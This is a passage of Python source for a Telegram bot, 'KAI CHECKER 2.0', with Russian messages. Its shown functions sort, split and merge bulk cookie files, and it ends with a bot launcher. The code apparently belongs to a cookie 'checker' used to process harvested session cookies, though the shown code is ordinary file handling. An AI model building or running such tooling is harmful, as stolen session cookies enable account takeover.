                        self.bot.send_document(msg.chat.id, f, caption="📄 Валидные куки")
                    os.remove(filename)
                
            except Exception as e:
                self.bot.edit_message_text(
                    f"<b>❌ ОШИБКА</b>\n\n{str(e)}",
                    chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
                )
            finally:
                self.checking = False
        
        import threading
        threading.Thread(target=do).start()

    # ============================================================
    # СОРТЕР
    # ============================================================

    def process_sorter(self, msg, cookies):
        self.checking = True
        st = self.bot.reply_to(msg, f"📂 Сортирую {len(cookies)} куков...")
        
        def do():
            try:
                zip_buffer = BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for i, cookie in enumerate(cookies[:50]):
                        zf.writestr(f"cookie_{i+1}.txt", cookie)
                
                zip_buffer.seek(0)
                self.bot.edit_message_text(
                    f"✅ Сортировка завершена!\n📦 {len(cookies[:50])} файлов в ZIP",
                    chat_id=msg.chat.id, message_id=st.message_id
                )
                self.bot.send_document(msg.chat.id, zip_buffer, caption="📦 Сортированные куки")
                
            except Exception as e:
                self.bot.edit_message_text(f"❌ Ошибка: {e}", chat_id=msg.chat.id, message_id=st.message_id)
            finally:
                self.checking = False
                self.waiting.pop(msg.chat.id, None)
        
        threading.Thread(target=do).start()

    # ============================================================
    # РАЗДЕЛИТЕЛЬ
    # ============================================================

    def process_split(self, msg, cookies):
        self.checking = True
        st = self.bot.reply_to(msg, f"✂️ Разделяю {len(cookies)} куков...")
        
        def do():
            try:
                parts = 5
                chunk_size = max(1, len(cookies) // parts)
                chunks = [cookies[i:i+chunk_size] for i in range(0, len(cookies), chunk_size)]
                
                zip_buffer = BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for i, chunk in enumerate(chunks[:5]):
                        zf.writestr(f"part_{i+1}.txt", '\n'.join(chunk))
                
                zip_buffer.seek(0)
                self.bot.edit_message_text(
                    f"✅ Разделение завершено!\n📦 {len(chunks[:5])} частей в ZIP",
                    chat_id=msg.chat.id, message_id=st.message_id
                )
                self.bot.send_document(msg.chat.id, zip_buffer, caption="📦 Разделённые куки")
                
            except Exception as e:
                self.bot.edit_message_text(f"❌ Ошибка: {e}", chat_id=msg.chat.id, message_id=st.message_id)
            finally:
                self.checking = False
                self.waiting.pop(msg.chat.id, None)
        
        threading.Thread(target=do).start()

    # ============================================================
    # СЛИЯНИЕ
    # ============================================================

    def process_merge_single(self, msg):
        if not hasattr(self, 'merge_files'):
            self.merge_files = []
        self.merge_files.append(msg.document)
        self.bot.reply_to(msg, f"📦 Файл принят ({len(self.merge_files)}). Отправь ещё или нажми /done")

    def process_merge_files(self, msg):
        self.checking = True
        st = self.bot.reply_to(msg, f"📦 Сливаю {len(self.merge_files)} файлов...")
        
        def do():
            try:
                all_cookies = []
                filenames = []
                
                for doc in self.merge_files:
                    if not doc.file_name.endswith('.txt'):
                        continue
                    fi = self.bot.get_file(doc.file_id)
                    dw = self.bot.download_file(fi.file_path)
                    ct = dw.decode('utf-8', errors='ignore')
                    cookies = extract_cookies(ct)
                    all_cookies.extend(cookies)
                    filenames.append(doc.file_name)
                
                if not all_cookies:
                    self.bot.edit_message_text("❌ Куки не найдены в файлах", chat_id=msg.chat.id, message_id=st.message_id)
                    self.checking = False
                    return
                
                unique_cookies = list(dict.fromkeys(all_cookies))
                
                filename = f"merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_cookies))
                
                self.bot.edit_message_text(
                    f"✅ Слияние завершено!\n"
                    f"📁 Файлов: {len(filenames)}\n"
                    f"📦 Всего куков: {len(unique_cookies)}\n"
                    f"🔄 Дублей удалено: {len(all_cookies) - len(unique_cookies)}",
                    chat_id=msg.chat.id, message_id=st.message_id
                )
                
                with open(filename, 'rb') as f:
                    self.bot.send_document(msg.chat.id, f, caption="📦 Слитые куки")
                os.remove(filename)
                
            except Exception as e:
                self.bot.edit_message_text(f"❌ Ошибка: {e}", chat_id=msg.chat.id, message_id=st.message_id)
            finally:
                self.checking = False
                self.waiting.pop(msg.chat.id, None)
                self.merge_files = []
        
        threading.Thread(target=do).start()

    def run(self):
        logger.info("🤖 KAI CHECKER 2.0")
        print("🤖 Бот запущен!")
        while True:
            try:
                self.bot.polling(none_stop=True, timeout=30)
            except Exception as e:
                logger.error(f"Polling error: {e}")
                time.sleep(5)

# ============================================================
# ЗАПУСК
# ============================================================

def run_bot():
    bot = Bot(TELEGRAM_BOT_TOKEN)
    bot.run()

if __name__ == "__main__":
    # Запускаем бота в фоновом потоке
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Запускаем Flask для Render
    port = int(os.environ.get("PORT", 5000))
    print(f"🌐 Flask запущен на порту {port}")
    app.run(host='0.0.0.0', port=port)
